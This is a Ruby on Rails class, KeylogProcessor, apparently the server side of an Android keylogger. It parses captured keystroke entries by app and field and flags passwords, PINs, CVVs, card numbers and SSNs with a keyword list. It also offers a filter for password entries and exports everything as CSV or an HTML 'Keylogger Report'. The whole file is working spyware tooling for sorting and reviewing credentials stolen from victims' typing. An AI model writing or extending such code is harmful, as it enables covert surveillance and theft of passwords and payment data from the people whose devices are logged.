# frozen_string_literal: true

# Processes raw keylog data from Android devices
# Parses JSON entries, extracts statistics, and prepares for storage
class KeylogProcessor
  attr_reader :raw_data, :entries, :stats

  def initialize(raw_data)
    @raw_data = raw_data
    @entries = parse_entries
    @stats = calculate_stats
  end

  # Parse keylog entries from raw data
  def parse_entries
    return [] if raw_data.blank?

    case raw_data
    when String
      parse_string_data
    when Array
      raw_data.map { |entry| normalize_entry(entry) }
    when Hash
      [normalize_entry(raw_data)]
    else
      []
    end
  rescue JSON::ParserError => e
    Rails.logger.error("[KeylogProcessor] JSON parse error: #{e.message}")
    []
  end

  # Calculate statistics from entries
  def calculate_stats
    {
      total_entries: entries.size,
      apps_logged: unique_apps.size,
      sensitive_fields: count_sensitive_fields,
      time_range: calculate_time_range,
      event_types: count_event_types,
      processed_at: Time.current.iso8601
    }
  end

  # Get unique app packages
  def unique_apps
    entries.map { |e| e[:app_package] }.compact.uniq
  end

  # Filter entries by app
  def entries_for_app(package_name)
    entries.select { |e| e[:app_package] == package_name }
  end

  # Get entries containing passwords
  def password_entries
    entries.select { |e| sensitive_field?(e) }
  end

  # Export to CSV format
  def to_csv
    return "" if entries.empty?

    headers = %w[timestamp app_package activity event_type keystroke input_type]
    CSV.generate do |csv|
      csv << headers
      entries.each do |entry|
        csv << headers.map { |h| entry[h.to_sym] }
      end
    end
  end

  # Generate HTML report with statistics and entries
  def to_html_report
    return "<p>No keylog data available.</p>" if entries.empty?

    html = <<~HTML
      <!DOCTYPE html>
      <html>
      <head>
        <style>
          body { font-family: Arial, sans-serif; margin: 20px; }
          h1 { color: #333; }
          .stats { background: #f4f4f4; padding: 15px; margin-bottom: 20px; border-radius: 5px; }
          .stats-item { display: inline-block; margin-right: 30px; }
          .stats-label { font-weight: bold; color: #666; }
          .warning { color: #d9534f; font-weight: bold; }
          table { width: 100%; border-collapse: collapse; margin-top: 20px; }
          th { background: #337ab7; color: white; padding: 10px; text-align: left; }
          td { padding: 8px; border-bottom: 1px solid #ddd; }
          tr:hover { background: #f5f5f5; }
          .sensitive { background: #fcf8e3; color: #8a6d3b; }
        </style>
      </head>
      <body>
        <h1>Keylogger Report</h1>
        <div class="stats">
          <div class="stats-item"><span class="stats-label">Total Entries:</span> #{stats[:total_entries]}</div>
          <div class="stats-item"><span class="stats-label">Apps Logged:</span> #{stats[:apps_logged]}</div>
          <div class="stats-item"><span class="stats-label warning">Sensitive Fields:</span> #{stats[:sensitive_fields]}</div>
          <div class="stats-item"><span class="stats-label">Processed:</span> #{stats[:processed_at]}</div>
        </div>
        <table>
          <thead>
            <tr>
              <th>Timestamp</th>
              <th>App</th>
              <th>Activity</th>
              <th>Event Type</th>
              <th>Field</th>
              <th>Input Type</th>
              <th>Text</th>
            </tr>
          </thead>
          <tbody>
    HTML

    entries.each do |entry|
      timestamp = entry[:timestamp] ? Time.at(entry[:timestamp] / 1000).strftime('%Y-%m-%d %H:%M:%S') : 'N/A'
      row_class = sensitive_field?(entry) ? ' class="sensitive"' : ''
      text = sanitize_html(entry[:full_text] || entry[:keystroke] || '')
      
      html += <<~ROW
            <tr#{row_class}>
              <td>#{sanitize_html(timestamp)}</td>
              <td>#{sanitize_html(entry[:app_package] || 'Unknown')}</td>
              <td>#{sanitize_html(entry[:activity] || 'Unknown')}</td>
              <td>#{sanitize_html(entry[:event_type] || 'N/A')}</td>
              <td>#{sanitize_html(entry[:field_id] || entry[:hint] || 'N/A')}</td>
              <td>#{sanitize_html(entry[:input_type] || 'N/A')}</td>
              <td>#{text}</td>
            </tr>
      ROW
    end

    html += <<~HTML
          </tbody>
        </table>
      </body>
      </html>
    HTML

    html
  end

  private

  def parse_string_data
    if raw_data.start_with?('[')
      JSON.parse(raw_data, symbolize_names: true)
    elsif raw_data.include?("\n")
      raw_data.split("\n").map do |line|
        next if line.blank?
        JSON.parse(line, symbolize_names: true) rescue nil
      end.compact
    else
      [JSON.parse(raw_data, symbolize_names: true)]
    end
  end

  def normalize_entry(entry)
    entry = entry.symbolize_keys if entry.respond_to?(:symbolize_keys)
    {
      timestamp: entry[:timestamp] || Time.current.to_i * 1000,
      session_id: entry[:session_id],
      event_type: entry[:event_type] || "TEXT_CHANGED",
      app_package: entry[:app_package],
      activity: entry[:activity],
      field_id: entry[:field_id],
      hint: entry[:hint],
      input_type: entry[:input_type],
      keystroke: entry[:keystroke],
      full_text: entry[:full_text]
    }
  end

  def count_sensitive_fields
    entries.count { |e| sensitive_field?(e) }
  end

  def sensitive_field?(entry)
    combined = "#{entry[:hint]} #{entry[:field_id]} #{entry[:input_type]}".downcase
    SENSITIVE_KEYWORDS.any? { |kw| combined.include?(kw) }
  end

  SENSITIVE_KEYWORDS = %w[password pass pwd pin cvv cvc ssn security secret key credit card account].freeze

  def calculate_time_range
    return {} if entries.empty?
    timestamps = entries.map { |e| e[:timestamp] }.compact
    return {} if timestamps.empty?
    {
      start: Time.at(timestamps.min / 1000).iso8601,
      end: Time.at(timestamps.max / 1000).iso8601,
      duration_seconds: (timestamps.max - timestamps.min) / 1000
    }
  end

  def count_event_types
    entries.group_by { |e| e[:event_type] }.transform_values(&:count)
  end

  # Sanitize HTML to prevent XSS
  def sanitize_html(text)
    return '' if text.blank?
    text.to_s.gsub(/[&<>"']/) do |char|
      case char
      when '&' then '&amp;'
      when '<' then '&lt;'
      when '>' then '&gt;'
      when '"' then '&quot;'
      when "'" then '&#39;'
      end
    end
  end
end
